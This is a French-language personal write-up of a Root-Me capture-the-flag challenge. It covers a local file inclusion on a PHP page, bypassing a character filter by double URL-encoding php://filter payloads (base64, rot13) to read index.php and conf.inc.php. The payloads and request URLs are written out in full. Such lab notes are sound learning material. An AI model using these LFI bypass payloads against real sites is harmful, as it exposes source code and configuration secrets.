<script src="../../../js/password-protect.js"></script>

---
categorie: web-server
tags:
  - rootme
  - "#informatique/cyber"
lien:
---
# But

RÃ©ussir a faire un lfi, mais les char url encodÃ© sont flagguÃ© et il faut donc les encodÃ© 2 fois


# Fourni

un site 

![[Pasted image 20241203125114.png]]

![[Pasted image 20241203125131.png]]



je vais faire un petit tableau pour faire mes doubles encodage facilement

| original | url-encode | double encode |
| -------- | ---------- | ------------- |
| /        | %2F        | %252F         |
| .        | %2E        | %252E         |
| :        | %3A        | %253A         |
| =        | %3D        | %253D         |
| â€“        | %96        | %2596         |

chaine que je veux double encoder pour faire un test : 

php%253A%252F%252Ffilter%252Fread%253Dconvert%252Ebase64%E2%80%93encode%252Fresource%253Dindex%252Ephp

php://filter/read=convert.base64-encode/resource=index.php




la j'ai un rÃ©sultat :


http://challenge01.root-me.org/web-serveur/ch45/index.php?page=php%253A%252F%252Ffilter%252Fread%253Dconvert%252Ebase64%E2%80%93encode%252Fresource%253Dhome

essayer de le faire avec un autre filtre ? ou un autre fichier ?
http://challenge01.root-me.org/web-serveur/ch45/index.php?page=php://filter/read=convert.base64-encode/resource=index.php

http://challenge01.root-me.org/web-serveur/ch45/index.php?page=php%253A%252F%252Ffilter%252Fread%253Dconvert%252Ebase64%E2%80%93encode%252Fresource%253Dhome


```
php://filter/string.rot13/resource=home
```

php%253A%252F%252Ffilter%252Fstring%252Erot13%252Fresource%253Dhome

string.rot13
string.toupper
string.tolower


parce que je voyais que les base 64 ne fonctionnaient pas, j'ai voulu faire du rot13 et du to upper, je tombe sur cela : 

![[Pasted image 20241203141228.png]]

je vois donc qu'un fichier conf.inc.php  existe

je peux faire la meme chose avec un autre filtre, rot13 et essayer d'afficher conf (to upper ne fonctionnait pas trop...)

![[Pasted image 20241203141827.png]]


![[Pasted image 20241203141837.png]]

Il ne faut pas forcement tester que "convert.base-64" mais aussi les autres.